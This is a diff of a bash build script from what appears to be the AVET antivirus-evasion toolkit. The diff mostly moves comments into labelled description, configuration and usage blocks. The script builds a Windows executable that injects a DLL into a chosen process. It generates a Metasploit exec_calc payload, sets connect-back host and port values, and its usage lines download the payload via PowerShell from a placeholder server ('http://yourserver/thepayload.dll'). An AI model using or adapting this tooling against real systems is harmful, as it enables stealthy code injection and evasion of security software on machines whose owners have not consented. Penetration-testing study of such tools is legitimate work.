@@ -1,17 +1,17 @@
 #!/bin/bash
+
+
+#DESCRIPTION_START
 # Dll injection 32-bit example build script
 # Creates an executable that injects a dll residing on the target's disk into a target process
 # Also creates an exec_calc 32-bit dll payload, and downloads the file via powershell onto the target's disk for injection
 # Target process and dll can be specified in the third(!) command line argument as format:		pid,dll_path
 
-# Host the generated metasploit dll payload via HTTP on port 80
-# Call the injector executable like:
-# injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.exe http://yourserver/thepayload.dll random target_pid,thepayload.dll
-# "random" just fills argv[2], which is not needed here
-
 # The download mechanism, as deployed here, is kind of a workaround to deliver the payload to the target.
 # download_powershel is "abused" as payload source, so the file is downloaded and read into memory, but that buffer is not used to deliver the dll.
 # Instead, the dll is read from disk (again) by the inject_dll payload execution method, and injected into the target process specified in payload_info.
+#DESCRIPTION_END
+
 
 # print AVET logo
 cat banner.txt
@@ -24,9 +24,15 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# enable debug output
+enable_debug_print
+#CONFIGURATION_END
+
 
 # import feature construction interface
 . build/feature_construction.sh
@@ -57,9 +63,6 @@ set_payload_info_source from_command_line_raw
 # set payload execution method
 set_payload_execution_method inject_dll
 
-# enable debug output
-enable_debug_print
-
 # compile 
 $win32_compiler -o output/injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.exe source/avet.c -lws2_32
 strip output/injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.exe
@@ -72,3 +75,11 @@ echo "
 # Call the injector executable like:
 # injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.exe http://yourserver/thepayload.dll random target_pid,thepayload.dll
 # 'random' just fills argv[2], which is not needed here"
+
+
+#USAGE_START
+# Host the generated metasploit dll payload via HTTP on port 80
+# Call the injector executable like:
+# injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.exe http://yourserver/thepayload.dll random target_pid,thepayload.dll
+# "random" just fills argv[2], which is not needed here
+#USAGE_END
